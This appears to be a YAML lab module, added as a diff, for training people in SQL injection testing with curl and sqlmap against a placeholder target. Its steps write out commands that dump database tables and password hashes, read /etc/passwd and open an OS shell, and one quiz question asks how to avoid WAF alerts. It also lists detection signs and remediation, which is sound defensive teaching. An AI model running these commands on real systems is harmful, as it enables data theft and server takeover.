@@ -1,0 +1,145 @@
+# Category: Web Application Security - Injection
+name: "SQL Injection (SQLi) Enumeration"
+id: "web-sqli-001"
+category: "web_application"
+subcategory: "injection"
+difficulty: "beginner"
+estimated_time: "45 minutes"
+
+description: |
+  Identify and exploit SQL injection vulnerabilities in web application parameters.
+  Covers error-based, union-based, and blind SQLi techniques.
+
+learning_objectives:
+  - Understand SQLi mechanics and database interaction
+  - Use sqlmap for automated detection and exploitation
+  - Extract database schema, users, and data
+  - Map findings to compliance controls (PCI DSS 6.5.1, OWASP A03:2021)
+
+tools:
+  - sqlmap
+  - curl
+  - burp_suite
+  - web_browser
+
+prerequisites:
+  - Basic SQL knowledge
+  - Understanding of HTTP requests and responses
+  - Written authorization from target owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify injectable parameters via manual testing"
+    commands:
+      - "curl -s 'http://[target_url]?id=1'"
+      - "curl -s 'http://[target_url]?id=1%27'"
+      - "curl -s \"http://[target_url]?id=1 AND 1=1\" -o resp1.html"
+      - "curl -s \"http://[target_url]?id=1 AND 1=2\" -o resp2.html"
+      - "diff resp1.html resp2.html"
+    expected_output: "Differences in responses indicate boolean-based injectable parameter"
+    detection: "Error messages such as 'You have an error in your SQL syntax'"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Automated detection with sqlmap"
+    commands:
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --level=2 --risk=1"
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --dbs"
+      - "sqlmap -u 'http://[target_url]?id=1' -D [database_name] --tables"
+      - "sqlmap -u 'http://[target_url]?id=1' -D [database_name] -T [table_name] --columns"
+    expected_output: "List of injectable parameters, databases, tables, and column names"
+    detection: "Multiple SQL keywords in HTTP parameters; response time anomalies"
+
+  - id: "step3"
+    phase: "enumeration"
+    action: "Extract database users and version"
+    commands:
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --current-user --current-db --hostname"
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --users --passwords"
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --privileges"
+    expected_output: "Database version, current user, available users and their privileges"
+    detection: "Queries to information_schema; rapid sequential SQL queries in web logs"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Extract sensitive data from target table"
+    commands:
+      - "sqlmap -u 'http://[target_url]?id=1' -D [database_name] -T [table_name] --dump"
+      - "sqlmap -u 'http://[target_url]?id=1' -D [database_name] -T [table_name] -C [column_names] --dump"
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --dump-all --exclude-sysdbs"
+    expected_output: "Rows of extracted data (credentials, PII, application data)"
+    detection: "Large number of SQL queries; unusual data transfer volumes"
+
+  - id: "step5"
+    phase: "post_exploitation"
+    action: "Attempt OS-level access via SQLi (if DB user has FILE privilege)"
+    commands:
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --file-read='/etc/passwd'"
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --os-shell"
+      - "sqlmap -u 'http://[target_url]?id=1' --batch --os-pwn"
+    expected_output: "File contents or interactive OS shell if privileges allow"
+    detection: "LOAD_FILE or INTO OUTFILE SQL operations in query logs"
+
+compliance_controls:
+  - standard: "PCI DSS v4.0"
+    control: "6.2.4"
+    description: "Prevent common software attacks including injection flaws"
+  - standard: "OWASP ASVS v4.0"
+    control: "5.1.1"
+    description: "HTTP request parameter validation using allowlist"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-10"
+    description: "Information input validation"
+  - standard: "CIS Controls v8"
+    control: "16.1"
+    description: "Use vetted libraries or frameworks for application security"
+
+detection:
+  network_indicators:
+    - "SQL keywords in URI parameters: SELECT, UNION, INSERT, DROP, OR 1=1"
+    - "Unusual characters in HTTP parameters: single quotes, double dashes, semicolons"
+    - "Response time anomalies indicating time-based blind SQLi (>1 second delay)"
+    - "Repeated requests with incrementally changing parameter values"
+  log_indicators:
+    - "Web server error logs showing database syntax errors"
+    - "Application logs with database exception stack traces"
+    - "High frequency of similar requests from same IP with varying parameters"
+  endpoint_indicators:
+    - "Database query logs showing UNION SELECT statements"
+    - "Queries to INFORMATION_SCHEMA, SYS, or DUAL tables"
+
+remediation:
+  immediate:
+    - "Use parameterized queries (prepared statements) for all database interactions"
+    - "Apply strict input validation using allowlist approach"
+    - "Remove or obscure detailed database error messages from user-facing responses"
+    - "Restrict database user privileges to minimum required (principle of least privilege)"
+  long_term:
+    - "Implement Web Application Firewall (WAF) with SQLi detection rules"
+    - "Integrate DAST scanning in CI/CD pipeline (OWASP ZAP, Burp Suite)"
+    - "Conduct regular code reviews focusing on database interaction code"
+    - "Deploy runtime application self-protection (RASP)"
+
+variables:
+  target_url: "http://target.example.com/page?id=1"
+  database_name: "appdb"
+  table_name: "users"
+  column_names: "username,password,email"
+
+assessment_questions:
+  - "What SQL error message indicates a MySQL backend versus MSSQL?"
+  - "How does UNION-based SQLi differ from blind boolean-based SQLi?"
+  - "Which sqlmap flag retrieves the current database user?"
+  - "What PCI DSS v4.0 control mandates protection against injection flaws?"
+  - "How would you confirm SQLi without triggering WAF alerts?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/SQL_Injection"
+    title: "OWASP SQL Injection"
+  - url: "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
+    title: "sqlmap Usage Documentation"
+  - url: "https://portswigger.net/web-security/sql-injection"
+    title: "PortSwigger SQL Injection Labs"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+    title: "OWASP SQL Injection Prevention Cheat Sheet"
